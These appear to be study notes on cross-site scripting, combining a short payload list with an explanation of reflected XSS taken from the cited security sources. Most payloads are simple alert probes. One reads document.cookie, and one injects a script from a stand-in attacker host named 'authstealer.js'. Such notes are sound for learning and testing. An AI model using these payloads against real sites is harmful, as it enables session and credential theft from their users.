- XSS is a Client Side Attack
- XSS TYPES
	* Persistent 
    	* (Type 1 XSS).
	* Non-Persistent
	* DOM Based

[SAMPLES]

* “><h1>Hello</h1><!--
* <script>alert(‘XSS');</script>
* “><script>alert(‘Vulnerable’)</script><!--
* me@email.com” <script>alert(1)</script><!--
* abc” onmouseover=alert(“XSS”) "
* <script>alert(document.cookie);</script>
    * PHPSESSID=899o5g8rvkshnd22774p31c130; __unam=44a7470-1674e5c92ff-4ec43af4-93
* <script type='text/javascript'>alert('xss');</script>
* http://forum.com?q=news<\script%20src="http://hackersite.com/authstealer.js
How to find XSS vulnerable pages with Google Dorks?

Reflected Cross Site Scripting (XSS) 

Cross-site scripting (XSS) is a web application vulnerability that permits an attacker to inject code, (typically HTML or JavaScript), into the contents of an outside website. When a victim views an infected page on the website, the injected code executes in the victim’s browser. Consequently, the attacker has bypassed the browser’s same origin policy and is able to steal private information from a victim associated with the website.
What is a Reflected XSS Attack
Reflected XSS attacks, also known as non-persistent attacks, occur when a malicious script is reflected off of a web application to the victim’s browser.
The script is activated through a link, which sends a request to a website with a vulnerability that enables execution of malicious scripts. The vulnerability is typically a result of incoming requests not being sufficiently sanitized, which allows for the manipulation of a web application’s functions and the activation of malicious scripts.
To distribute the malicious link, a perpetrator typically embeds it into an email or third party website (e.g., in a comment section or in social media). The link is embedded inside an anchor text that provokes the user to clicking on the it, which initiates the XSS request to an exploited website, reflecting the attack back to the user.

As such, there are a number of key differences between reflected and stored XSS attacks, including:
* Reflected attacks are more common.
* Reflected attacks do not have the same reach as stored XSS attacks.
* Reflected attacks can be avoided by vigilant users.
With a reflected XSS, the perpetrator plays a “numbers game” by sending the malicious link to as many users as possible, thereby improving his odds of successfully executing the attack.


[SOURCE]

https://www.incapsula.com/web-application-security/reflected-xss-attacks.html
https://medium.com/bugbountywriteup/tagged/xss-attack
https://medium.com/bugbountywriteup/tagged/xss-attack
https://medium.com/bugbountywriteup/xss-bypass-using-meta-tag-in-realestate-postnl-nl-32db25db7308
https://medium.com/bugbountywriteup/how-i-found-an-xss-vulnerability-on-the-most-prestigious-engineering-university-of-india-bb133c4d0d82
https://medium.com/bugbountywriteup/reflected-dom-xss-and-clickjacking-on-https-silvergoldbull-de-bt-html-daa36bdf7bf0
https://www.pentesteracademy.com/video?id=388
